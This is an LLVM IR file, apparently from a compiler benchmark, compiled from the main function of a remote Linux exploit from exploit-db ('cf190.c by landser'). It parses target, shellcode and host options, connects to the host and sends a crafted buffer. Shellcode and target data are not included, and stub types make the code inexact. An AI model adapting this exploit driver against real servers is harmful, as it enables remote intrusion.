; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1582.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1582.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_5__ = type { i32 }
%struct.TYPE_4__ = type { i64 }

@.str = private unnamed_addr constant [43 x i8] c"cf190.c by landser - ihsahn at gmail com\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"t:p:h:d:s:\00", align 1
@shellcodes = common dso_local global %struct.TYPE_5__* null, align 8
@optarg = common dso_local global i32 0, align 4
@sc = common dso_local global i32 0, align 4
@n = common dso_local global i64 0, align 8
@EXIT_FAILURE = common dso_local global i32 0, align 4
@targets = common dso_local global %struct.TYPE_4__* null, align 8
@.str.2 = private unnamed_addr constant [16 x i8] c"invalid target\0A\00", align 1
@optind = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [13 x i8] c"no hostname\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [11 x i8] c"> sending\0A\00", align 1
@s = common dso_local global i32 0, align 4
@buf = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"send()\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"> done\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i16, align 2
  %8 = alloca i8*, align 8
  %9 = alloca i8, align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i16 0, i16* %7, align 2
  store i8* null, i8** %8, align 8
  %10 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0))
  br label %11

11:                                               ; preds = %47, %2
  %12 = load i32, i32* %4, align 4
  %13 = load i8**, i8*** %5, align 8
  %14 = call signext i8 @getopt(i32 %12, i8** %13, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0))
  store i8 %14, i8* %9, align 1
  %15 = sext i8 %14 to i32
  %16 = icmp ne i32 %15, -1
  br i1 %16, label %17, label %48

17:                                               ; preds = %11
  %18 = load i8, i8* %9, align 1
  %19 = sext i8 %18 to i32
  switch i32 %19, label %47 [
    i32 115, label %20
    i32 104, label %27
    i32 100, label %30
    i32 116, label %34
    i32 112, label %37
    i32 63, label %41
  ]

20:                                               ; preds = %17
  %21 = load %struct.TYPE_5__*, %struct.TYPE_5__** @shellcodes, align 8
  %22 = load i32, i32* @optarg, align 4
  %23 = call i64 @atoi(i32 %22)
  %24 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %21, i64 %23
  %25 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %24, i32 0, i32 0
  %26 = load i32, i32* %25, align 4
  store i32 %26, i32* @sc, align 4
  br label %47

27:                                               ; preds = %17
  %28 = load i32, i32* @optarg, align 4
  %29 = call i8* @strdup(i32 %28)
  store i8* %29, i8** %8, align 8
  br label %47

30:                                               ; preds = %17
  %31 = load i32, i32* @optarg, align 4
  %32 = call i64 @atoi(i32 %31)
  %33 = trunc i64 %32 to i16
  store i16 %33, i16* %7, align 2
  br label %47

34:                                               ; preds = %17
  %35 = load i32, i32* @optarg, align 4
  %36 = call i64 @atoi(i32 %35)
  store i64 %36, i64* @n, align 8
  br label %47

37:                                               ; preds = %17
  %38 = load i32, i32* @optarg, align 4
  %39 = call i64 @atoi(i32 %38)
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %6, align 4
  br label %47

41:                                               ; preds = %17
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 0
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @usage(i8* %44)
  %46 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %46, i32* %3, align 4
  br label %115

47:                                               ; preds = %17, %37, %34, %30, %27, %20
  br label %11

48:                                               ; preds = %11
  %49 = load i64, i64* @n, align 8
  %50 = icmp ult i64 %49, 0
  br i1 %50, label %56, label %51

51:                                               ; preds = %48
  %52 = load i64, i64* @n, align 8
  %53 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %54 = call i64 @structsize(%struct.TYPE_4__* %53)
  %55 = icmp uge i64 %52, %54
  br i1 %55, label %56, label %63

56:                                               ; preds = %51, %48
  %57 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0))
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 0
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 @usage(i8* %60)
  %62 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %62, i32* %3, align 4
  br label %115

63:                                               ; preds = %51
  %64 = load i32, i32* @optind, align 4
  %65 = add nsw i32 %64, 1
  %66 = load i32, i32* %4, align 4
  %67 = icmp ne i32 %65, %66
  br i1 %67, label %68, label %75

68:                                               ; preds = %63
  %69 = call i32 @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  %70 = load i8**, i8*** %5, align 8
  %71 = getelementptr inbounds i8*, i8** %70, i64 0
  %72 = load i8*, i8** %71, align 8
  %73 = call i32 @usage(i8* %72)
  %74 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %74, i32* %3, align 4
  br label %115

75:                                               ; preds = %63
  %76 = load i8**, i8*** %5, align 8
  %77 = load i32, i32* @optind, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8*, i8** %76, i64 %78
  %80 = load i8*, i8** %79, align 8
  %81 = load i32, i32* %6, align 4
  %82 = icmp ne i32 %81, 0
  br i1 %82, label %83, label %85

83:                                               ; preds = %75
  %84 = load i32, i32* %6, align 4
  br label %87

85:                                               ; preds = %75
  %86 = load i32, i32* @PORT, align 4
  br label %87

87:                                               ; preds = %85, %83
  %88 = phi i32 [ %84, %83 ], [ %86, %85 ]
  %89 = call i32 @establish(i8* %80, i32 %88)
  %90 = load i32, i32* @sc, align 4
  %91 = load i16, i16* %7, align 2
  %92 = load i8*, i8** %8, align 8
  %93 = call i32 @update(i32 %90, i16 zeroext %91, i8* %92)
  %94 = call i32 (...) @writebuf()
  %95 = call i32 @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0))
  %96 = load i32, i32* @s, align 4
  %97 = load i32, i32* @buf, align 4
  %98 = load %struct.TYPE_4__*, %struct.TYPE_4__** @targets, align 8
  %99 = load i64, i64* @n, align 8
  %100 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %98, i64 %99
  %101 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %100, i32 0, i32 0
  %102 = load i64, i64* %101, align 8
  %103 = add nsw i64 %102, 2
  %104 = call i64 @send(i32 %96, i32 %97, i64 %103, i32 0)
  %105 = icmp slt i64 %104, 0
  br i1 %105, label %106, label %109

106:                                              ; preds = %87
  %107 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  %108 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %108, i32* %3, align 4
  br label %115

109:                                              ; preds = %87
  %110 = call i32 @usleep(i32 100000)
  %111 = call i32 @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0))
  %112 = load i32, i32* @s, align 4
  %113 = call i32 @close(i32 %112)
  %114 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %114, i32* %3, align 4
  br label %115

115:                                              ; preds = %109, %106, %68, %56, %41
  %116 = load i32, i32* %3, align 4
  ret i32 %116
}

declare dso_local i32 @printf(i8*) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i64 @atoi(i32) #1

declare dso_local i8* @strdup(i32) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i64 @structsize(%struct.TYPE_4__*) #1

declare dso_local i32 @establish(i8*, i32) #1

declare dso_local i32 @update(i32, i16 zeroext, i8*) #1

declare dso_local i32 @writebuf(...) #1

declare dso_local i64 @send(i32, i32, i64, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
